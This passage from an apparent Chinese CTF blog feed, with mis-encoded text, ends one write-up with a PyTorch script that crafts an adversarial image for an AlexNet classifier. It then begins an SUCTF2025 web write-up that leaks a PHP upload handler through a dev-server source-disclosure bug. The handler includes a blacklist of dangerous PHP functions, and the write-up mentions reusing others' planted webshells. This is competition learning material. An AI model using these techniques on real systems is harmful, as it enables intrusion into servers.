class="hljs-literal">True</span>),<br>            nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>        )<br>        <span class="hljs-variable language_">self</span>.avgpool = nn.AdaptiveAvgPool2d((<span class="hljs-number">6</span>, <span class="hljs-number">6</span>))<br>        <span class="hljs-variable language_">self</span>.classifier = nn.Sequential(<br>            nn.Dropout(p=dropout),<br>            nn.Linear(<span class="hljs-number">256</span> * <span class="hljs-number">6</span> * <span class="hljs-number">6</span>, <span class="hljs-number">4096</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Dropout(p=dropout),<br>            nn.Linear(<span class="hljs-number">4096</span>, <span class="hljs-number">4096</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Linear(<span class="hljs-number">4096</span>, num_classes),<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x: torch.Tensor</span>) -&gt; torch.Tensor:<br>        x = <span class="hljs-variable language_">self</span>.features(x)<br>        x = <span class="hljs-variable language_">self</span>.avgpool(x)<br>        x = torch.flatten(x, <span class="hljs-number">1</span>)<br>        x = <span class="hljs-variable language_">self</span>.classifier(x)<br>        <span class="hljs-keyword">return</span> x<br><br><br>model = AlexNet(num_classes=<span class="hljs-number">2</span>)<br>model.load_state_dict(torch.load(<span class="hljs-string">&#x27;model_AlexNet.pth&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>), weights_only=<span class="hljs-literal">True</span>))<br>model.<span class="hljs-built_in">eval</span>()<br><br>image = torch.randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">300</span>, <span class="hljs-number">600</span>)) / <span class="hljs-number">1.0</span><br>image = torch.cat([image, image, image], dim=<span class="hljs-number">1</span>)<br>criterion = nn.CrossEntropyLoss()<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):<br>    <br>    image.requires_grad = <span class="hljs-literal">True</span><br>    pred = model(image)<br>    loss = criterion(pred, torch.tensor([<span class="hljs-number">1</span>], dtype=torch.long))<br>    loss.backward()<br>    <span class="hljs-built_in">print</span>(loss.item())<br><br>    image.requires_grad = <span class="hljs-literal">False</span><br>    grad = torch.<span class="hljs-built_in">sum</span>(image.grad, dim=<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">600</span>):<br>            <span class="hljs-keyword">if</span> grad[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, x, y] &gt; <span class="hljs-number">0</span>:<br>                image[<span class="hljs-number">0</span>, :, x, y] = <span class="hljs-number">0.</span><br>            <span class="hljs-keyword">else</span>:<br>                image[<span class="hljs-number">0</span>, :, x, y] = <span class="hljs-number">1.</span><br><br>    transforms.ToPILImage()(image[<span class="hljs-number">0</span>].detach().cpu()).save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åå°†å›¾ç‰‡base64ç¼–ç åå‘é€ã€‚</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æ€»ä¹‹ç¬¬ä¸‰å¤©æ”¶çš„é¢˜ç¡®å®çƒ‚ä¸­çƒ‚ï¼Œè¿˜æ˜¯ç¬¬äºŒå¤©é‚£ä¸ªbookshelfç®—æ˜¯å¥½é¢˜ã€‚ç¬¬ä¸€å¤©Gotarä¹Ÿè¿˜å¯ä»¥ã€‚</p><p>ç»§ç»­çœ‹javaäº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF2025-WEB-Learning</title>
    <link href="/2025/01/15/SUCTF2025-WEB-Learning/"/>
    <url>/2025/01/15/SUCTF2025-WEB-Learning/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç»ˆäºè€ƒå®Œäº†ï¼Œå›é‡åº†å’Œé«˜ä¸­åŒå­¦ç©äº†å‡ å¤©ã€‚ã€‚ã€‚</p><p>å›å®¶åæ‰“äº†ä¸¤å¤©æ¸¸æˆï¼Œå‘ç°ä¸€ç›´æ‰“ä¹Ÿä¸å¥½ç©ï¼Œå°±å¤ç°å¤ç°å‰å‡ å¤©éšä¾¿çœ‹çœ‹çš„XCTFï¼Œå¾ˆå¤šé¢˜æ„Ÿè§‰è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œå°±å½“ä¸€ç§å¤å¥äº†ã€‚</p><h2 id="SU-photogallery"><a href="#SU-photogallery" class="headerlink" title="SU_photogallery"></a>SU_photogallery</h2><p>æ‰«æå¯ä»¥æ‰«åˆ°robots.txtå’Œnode.mdï¼Œä¹Ÿå°±æ˜¯ç¯å¢ƒé‡Œçš„å­—ï¼š</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang">ä¹¦é±¼å“¥å“¥äº¤ç»™æˆ‘ä¸ªä»»åŠ¡ï¼Œè®©æˆ‘å†™ä¸€ä¸ªsuçš„å›¾åº“æ¥å­˜æ”¾æˆ˜é˜Ÿçš„ç¾å¥½å›å¿†ï¼Œæˆ‘éœ€è¦æµ‹è¯•æˆ‘å¼€å‘çš„ä»£ç ï¼Œäºæ˜¯æˆ‘åœ¨æœåŠ¡å™¨ä¸Šæµ‹è¯•ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•çš„æ—¶å€™å¹¶ä¸æƒ³å¤§è´¹å‘¨ç« æ”¹å˜æˆ‘åŸæœ¬é…ç½®çš„ç¯å¢ƒã€‚<br><br><span class="hljs-number">1</span>ï¼šå¯ä»¥æäº¤ä¸€å¼ å›¾ç‰‡ï¼ˆWorkingï¼‰<br><br><span class="hljs-number">2</span>ï¼šé€šè¿‡æäº¤å‹ç¼©åŒ…æ¥æ‰¹é‡æäº¤å›¾ç‰‡<br><br><span class="hljs-number">3</span>...<br></code></pre></td></tr></table></figure><p>éšä¾¿è¾“urlï¼Œå‘ç°404æ˜¯php -Sä¸´æ—¶å¼€å¯çš„æœåŠ¡ã€‚</p><p>è¿™é‡Œæ‰“çš„æ˜¯<code>PHP&lt;=7.4.21 Development Serveræºç æ³„éœ²æ¼æ´</code></p><p><a href="https://cloud.tencent.com/developer/article/2235691">PHP&lt;&#x3D;7.4.21 Development Serveræºç æ³„éœ²æ¼æ´-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p><p>å‰ç«¯å¯ä»¥çœ‹åˆ°unzip.phpçš„æ–‡ä»¶åï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115200227659.png" alt="image-20250115200227659"></p><p>æ³„éœ²å‡º<code>unzip.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_extension</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>, PATHINFO_EXTENSION);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>,<span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$filename</span>;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">get_extension</span>(<span class="hljs-variable">$filename</span>));<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>                <span class="hljs-comment">// echo &quot;Fail to delete file: $filename\n&quot;;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// echo &quot;This file format is not supported:$extension\n&quot;;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>    <br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// echo &quot;nofile&quot;;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_rename</span> (<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-variable">$randomName</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-number">99999</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-title function_ invoke__">get_extension</span>(<span class="hljs-variable">$file</span>);<br>                <span class="hljs-variable">$oldPath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$file</span>;<br>                <span class="hljs-variable">$newPath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$randomName</span>;<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$oldPath</span>, <span class="hljs-variable">$newPath</span>)) &#123;<br>                    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$file</span>);<br>                    <span class="hljs-comment">// echo &quot;Fail to rename file: $file\n&quot;;</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">move_file</span>(<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$basePath</span></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;*&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-variable">$destination</span> = <span class="hljs-variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$destination</span>))&#123;<br>            <span class="hljs-comment">// echo &quot;Fail to rename file: $file\n&quot;;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_base</span>(<span class="hljs-params"><span class="hljs-variable">$fileContent</span></span>)</span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;phar&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;DOCTYPE&#x27;</span>, <span class="hljs-string">&#x27;iconv&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;hex2bin&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;function&#x27;</span>, <span class="hljs-string">&#x27;pcntl_exec&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;call_user_func&#x27;</span>, <span class="hljs-string">&#x27;getallheaders&#x27;</span>, <span class="hljs-string">&#x27;get_defined_vars&#x27;</span>,<span class="hljs-string">&#x27;info&#x27;</span>];<br>    <span class="hljs-variable">$base64_keywords</span> = [];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$keyword</span>) &#123;<br>        <span class="hljs-variable">$base64_keywords</span>[] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$keyword</span>);<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$base64_keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$base64_keyword</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fileContent</span>, <span class="hljs-variable">$base64_keyword</span>)!== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_content</span>(<span class="hljs-params"><span class="hljs-variable">$zip</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$zip</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$fileInfo</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">statIndex</span>(<span class="hljs-variable">$i</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$fileInfo</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-comment">//        if (preg_match(&#x27;/\.\.(\/|\.|%2e%2e%2f)/i&#x27;, $fileName)) &#123;</span><br><span class="hljs-comment">//            return false;</span><br><span class="hljs-comment">//        &#125;</span><br>             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Checking file: <span class="hljs-subst">$fileName</span>\n&quot;</span>;<br>            <span class="hljs-variable">$fileContent</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getFromName</span>(<span class="hljs-variable">$fileName</span>);<br>            <br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#x27;</span>, <span class="hljs-variable">$fileContent</span>) || <span class="hljs-title function_ invoke__">check_base</span>(<span class="hljs-variable">$fileContent</span>)) &#123;<br>                <span class="hljs-comment">// echo &quot;Don&#x27;t hack me!\n&quot;;    </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"><span class="hljs-variable">$zipname</span>, <span class="hljs-variable">$basePath</span></span>) </span>&#123;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$zipname</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Zip file does not exist&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;zip_not_found&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipname</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to open zip file&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;zip_open_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_content</span>(<span class="hljs-variable">$zip</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;malicious_content_detected&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$randomDir</span> = <span class="hljs-string">&#x27;tmp_&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-number">99999</span>));<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$randomDir</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to create directory&quot;;</span><br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;mkdir_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-variable">$path</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to extract zip file&quot;;</span><br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$zip</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$fileInfo</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">statIndex</span>(<span class="hljs-variable">$i</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$fileInfo</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$fileName</span>, <span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-comment">// echo &quot;Unsupported file extension&quot;;</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_rename</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$fileName</span>)) &#123;<br>            <span class="hljs-comment">// echo &quot;File rename failed&quot;;</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">move_file</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$basePath</span>)) &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-comment">// echo &quot;Fail to move file&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;move_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><br><span class="hljs-variable">$uploadDir</span> = <span class="hljs-keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;upload/suimages/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadDir</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$uploadDir</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;<br>    <span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$zipname</span> = <span class="hljs-variable">$uploadedFile</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$uploadDir</span>;<br><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">unzip</span>(<span class="hljs-variable">$zipname</span>, <span class="hljs-variable">$path</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php?status=success&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php?status=<span class="hljs-subst">$result</span>&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php?status=file_error&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥å¾—åˆ°æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„æ˜¯ï¼š<code>upload/suimages/</code></p><p>è¿™é‡Œçš„éé¢„æœŸå°±æ˜¯ä½ è®¿é—®å¯ä»¥æ‰¾åˆ°å…¶ä»–äººå†™çš„é©¬ï¼Œç„¶åç”¨å¼€å¤´é‚£ä¸ªä¸€æ ·çš„æ–¹æ³•å°±å¯ä»¥è®¿é—®ğŸçš„å‚æ•°æ˜¯å•¥ï¼Œè¹­è½¦å°±å®Œäº‹äº†ã€‚ã€‚ã€‚</p><p>çœŸæ­£ç»•è¿™ä¸ªblacklistçš„æ‰‹æ®µï¼Œåç»­é˜Ÿé‡Œä¹Ÿæœ‰äººåšå‡ºæ¥äº†ï¼Œä½†æ˜¯è¹­è½¦æå‰äº¤äº†å°±äº¤äº†å§hh</p><p>å®˜æ–¹ç»™çš„wpè¯´æ˜¯åœ¨ä¸Šä¼ çš„æ—¶å€™å°±è§£å‹å‹ç¼©åŒ…äº†,å¯ä»¥ç›´æ¥åˆ©ç”¨è§£å‹æŠ¥é”™ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">å›å¿†phpcmså¤´åƒä¸Šä¼ æ¼æ´ä»¥åŠåç»­å½±å“ | ç¦»åˆ«æ­Œ</a></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115201621408.png" alt="image-20250115201621408"></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115201629300.png" alt="image-20250115201629300"></p><p>ä»¥åŠï¼š<a 